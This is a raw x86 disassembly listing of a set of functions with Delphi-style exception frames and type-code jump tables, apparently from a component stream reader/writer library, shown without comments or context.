mov eax [ ebx ]
mov edx 0x1
call sub_41e404
jmp r-xdata
mov eax [ ebx ]
call sub_41e00c
mov eax [ ebx ]
call sub_41c158
test al al
je r-xdata
mov eax [ ebx ]
call sub_41e1a8
mov eax [ ebx ]
call sub_41d0c4
sub_41e00c
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e19b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41defc
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e1a2
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
jmp [ eax * 4 + jump_table_41e043 ]
push ebp
call sub_41df58
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41e404
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41e404
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e404
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41e404
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41dd20
jmp r-xdata
push ebp
mov eax 0x1
call sub_41df80
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41df10
jmp r-xdata
push ebp
mov eax 0x1
call sub_41df80
pop ecx
jmp r-xdata
push ebp
call sub_41dfb0
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e404
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e404
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e404
jmp r-xdata
push ebp
mov eax 0x2
call sub_41df80
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e404
jmp r-xdata
push ebp
mov eax 0x1
call sub_41df80
pop ecx
sub_41e1a8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41e1e5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41dd20
mov eax ebx
call sub_41e00c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e1ec
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_41e1f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41e288
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41c158
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41dd20
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41dd20
jmp r-xdata
mov eax ebx
call sub_41e1a8
mov eax ebx
call sub_41d0c4
jmp r-xdata
mov eax ebx
call sub_41c158
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41e1f0
mov eax ebx
call sub_41d0c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e28f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040d0
retn
sub_41e298
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41e33d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404144
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_421878
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e344
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
sub_41e368
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41e390
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41c3f0
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_417e48
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_4034c4
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41c3f0
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41e404
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41c4c0
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41c4c0
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41e44c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41e5f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41c024
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e5d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c4c0
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41aeec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41c4c0
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8e0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e5ab
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41dd5c
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41c4c0
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41aeec
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41c4c0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_414818
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
lea eax [ ebp - 0x1c ]
call sub_405944
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d598
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e5b2
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
sub_41e614
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e80e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40f24c
mov eax [ ebp - 0x4 ]
call sub_41c49c
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
jmp [ eax * 4 + jump_table_41e656 ]
mov eax [ ebp - 0x4 ]
call sub_41defc
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d00c
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_4133dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d00c
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_4133dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d00c
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_4133dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cdf0
mov eax ebx
call sub_4135d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ce34
mov eax ebx
call sub_4135d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ce78
mov eax ebx
call sub_4135fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cec8
mov eax ebx
call sub_4135e8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41dd5c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_413610
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41de18
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_41363c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41defc
cmp al 0x9
sete dl
mov eax ebx
call sub_4135ac
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41e44c
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f574
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d078
push edx
push eax
mov eax ebx
call sub_4134d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e815
lea eax [ ebp - 0x1c ]
call sub_40f260
lea eax [ ebp - 0xc ]
call sub_4047b8
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov eax ebx
call sub_414900
jmp r-xdata
sub_41e81c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_41e9e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b928
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_41e854
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_420920
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_41e87c
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_420920
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_41e960
sub_41e8c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41ae68
cmp eax esi
jg r-xdata
mov eax ebx
call sub_41e9e8
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41ae88
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_41e914
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41e9e8
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41e960
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e9d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_420b6c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e914
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41e914
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9de
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
sub_41ea14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41ea57
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404294
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_420a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea5e
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_41ea64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_41eaf6
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_420b6c
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f2f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eafd
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_419720
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_41f2f0
mov edx esi
mov eax edi
call sub_419728
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f344
mov eax [ ebp - 0x4 ]
call sub_41f2f8
inc esi
dec ebx
jne r-xdata
sub_41eb04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_4189b0
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_408020
test al al
jne r-xdata
sub_41eb54
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41ec9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_421994
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41eb04
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_421968
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_421994
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_421968
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eca2
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_421968
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_421968
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41eca8
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f084
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403200
xor ebx ebx
mov bl [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_40436c
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e8a8
mov [ ebp - 0xc ] eax
mov al [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e9e8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov dl [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_41f300
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403200
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_404310
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_420984
mov eax [ ebp - 0x8 ]
call sub_4031f8
call sub_4034d8
call sub_414ba0
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_404310
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403200
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_404310
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_40442c
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_420984
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f344
mov eax [ ebp - 0x4 ]
call sub_41f2f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_41f025
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420984
mov eax [ ebp - 0x4 ]
call sub_41e8a8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4189b0
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f02c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_41efe3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_41eb54
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_4034ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4032b0
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_41e848
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_4034ac
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_41f02c
mov eax [ ebp - 0x4 ]
call sub_41f2f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f08b
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_4040d0
retn
mov al [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e8a8
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41e8c0
sub_41f0a8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x28 ] ecx
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x18 ] esi
mov [ ebx + 0x1c ] esi
mov eax ebx
call sub_420974
mov edx esi
mov eax ebx
call sub_41eb54
pop esi
pop ebx
retn
sub_41f0d0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_420b6c
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_41e914
pop ebx
pop ebp
retn 0xc
sub_41f0f4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_420b6c
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e914
pop ebx
pop ebp
retn 0x4
sub_41f118
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_420b6c
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e914
pop ebx
pop ebp
retn 0x8
sub_41f13c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_420b6c
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e914
pop ebx
pop ebp
retn 0x8
sub_41f160
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_408020
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_408020
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_420b6c
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_408020
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_420b6c
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_408020
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_420b6c
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_420b6c
